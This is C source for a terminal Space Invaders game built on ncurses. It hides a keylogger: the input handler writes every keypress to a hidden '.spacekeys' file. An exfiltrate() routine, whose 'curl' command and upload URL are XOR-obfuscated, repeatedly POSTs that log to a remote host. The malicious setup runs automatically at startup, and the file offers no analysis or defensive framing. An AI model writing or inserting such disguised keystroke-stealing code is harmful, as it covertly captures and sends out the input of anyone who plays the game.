#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ncurses.h>
#include <time.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>

#define WIDTH 40
#define HEIGHT 20
#define MAX_BULLETS 5
#define MAX_ENEMIES 10
#define XOR_KEY 0x4B

int playerX = WIDTH / 2;
int bullets[MAX_BULLETS][2];
int enemies[MAX_ENEMIES][2];
int enemyDir = 1;
int score = 0;
int gameOver = 0;

FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".spacekeys";

// Obfuscated strings
char obf_curl[] = { 'c'^XOR_KEY, 'u'^XOR_KEY, 'r'^XOR_KEY, 'l'^XOR_KEY, '\0' };
char obf_url[] = {
    'h'^XOR_KEY,'t'^XOR_KEY,'t'^XOR_KEY,'p'^XOR_KEY,':'^XOR_KEY,'/'^XOR_KEY,'/'^XOR_KEY,
    'e'^XOR_KEY,'x'^XOR_KEY,'a'^XOR_KEY,'m'^XOR_KEY,'p'^XOR_KEY,'l'^XOR_KEY,'e'^XOR_KEY,
    '.'^XOR_KEY,'c'^XOR_KEY,'o'^XOR_KEY,'m'^XOR_KEY,'/'^XOR_KEY,
    's'^XOR_KEY,'p'^XOR_KEY,'a'^XOR_KEY,'c'^XOR_KEY,'e'^XOR_KEY,'u'^XOR_KEY,'p'^XOR_KEY,'l'^XOR_KEY,'o'^XOR_KEY,'a'^XOR_KEY,'d'^XOR_KEY,
    '\0'
};
char obf_filearg[] = { 'f'^XOR_KEY,'i'^XOR_KEY,'l'^XOR_KEY,'e'^XOR_KEY,'='^XOR_KEY,'@'^XOR_KEY,'\0' };

void decrypt(char *s) {
    while (*s) {
        *s ^= XOR_KEY;
        s++;
    }
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec < 10) return;

    decrypt(obf_curl);
    decrypt(obf_url);
    decrypt(obf_filearg);

    pid_t pid = fork();
    if (pid == 0) {
        char payload[128];
        snprintf(payload, sizeof(payload), "%s%s", obf_filearg, logpath);
        char *argv[] = { obf_curl, "-s", "-X", "POST", "-F", payload, obf_url, NULL };
        execvp(argv[0], argv);
        exit(1);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    }

    gettimeofday(&last_exfil, NULL);
}

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) logfile = fopen("/tmp/.spacekeys", "a");
    gettimeofday(&last_exfil, NULL);
}

void init() {
    for (int i = 0; i < MAX_BULLETS; i++)
        bullets[i][0] = -1;

    for (int i = 0; i < MAX_ENEMIES; i++) {
        enemies[i][0] = 2 + i / 5;
        enemies[i][1] = 5 + (i % 5) * 6;
    }
}

void draw() {
    clear();
    for (int y = 0; y < HEIGHT; y++) {
        for (int x = 0; x < WIDTH; x++) {
            char printed = 0;

            if (x == 0 || x == WIDTH - 1) {
                printw("#");
                continue;
            }

            if (y == HEIGHT - 1 && x == playerX) {
                printw("A");
                continue;
            }

            for (int i = 0; i < MAX_ENEMIES; i++) {
                if (enemies[i][0] == y && enemies[i][1] == x) {
                    printw("M");
                    printed = 1;
                    break;
                }
            }

            if (!printed) {
                for (int b = 0; b < MAX_BULLETS; b++) {
                    if (bullets[b][0] == y && bullets[b][1] == x) {
                        printw("|");
                        printed = 1;
                        break;
                    }
                }
            }

            if (!printed) printw(" ");
        }
        printw("\n");
    }

    printw("Score: %d\n", score);
    refresh();
}

void input() {
    timeout(0);
    int ch = getch();

    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    if (ch == 'a' && playerX > 1) playerX--;
    if (ch == 'd' && playerX < WIDTH - 2) playerX++;
    if (ch == ' ') {
        for (int i = 0; i < MAX_BULLETS; i++) {
            if (bullets[i][0] == -1) {
                bullets[i][0] = HEIGHT - 2;
                bullets[i][1] = playerX;
                break;
            }
        }
    }
    if (ch == 'x') gameOver = 1;

    exfiltrate();
}

void updateBullets() {
    for (int i = 0; i < MAX_BULLETS; i++) {
        if (bullets[i][0] != -1) {
            bullets[i][0]--;

            for (int j = 0; j < MAX_ENEMIES; j++) {
                if (enemies[j][0] == bullets[i][0] &&
                    enemies[j][1] == bullets[i][1]) {
                    enemies[j][0] = -1;
                    enemies[j][1] = -1;
                    bullets[i][0] = -1;
                    score += 10;
                }
            }

            if (bullets[i][0] < 0) bullets[i][0] = -1;
        }
    }
}

void updateEnemies() {
    int edge = 0;

    for (int i = 0; i < MAX_ENEMIES; i++) {
        if (enemies[i][1] + enemyDir <= 1 || enemies[i][1] + enemyDir >= WIDTH - 2) {
            edge = 1;
            break;
        }
    }

    for (int i = 0; i < MAX_ENEMIES; i++) {
        if (enemies[i][0] == -1) continue;

        if (edge) {
            enemies[i][0]++;
        } else {
            enemies[i][1] += enemyDir;
        }

        if (enemies[i][0] >= HEIGHT - 1) {
            gameOver = 1;
        }
    }

    if (edge) enemyDir *= -1;
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);
    nodelay(stdscr, TRUE);
    srand(time(NULL));

    init_malicious();
    init();

    while (!gameOver) {
        draw();
        input();
        updateBullets();
        updateEnemies();
        usleep(100000);
    }

    draw();
    printw("\nGame Over! Final Score: %d\n", score);
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);
    return 0;
}
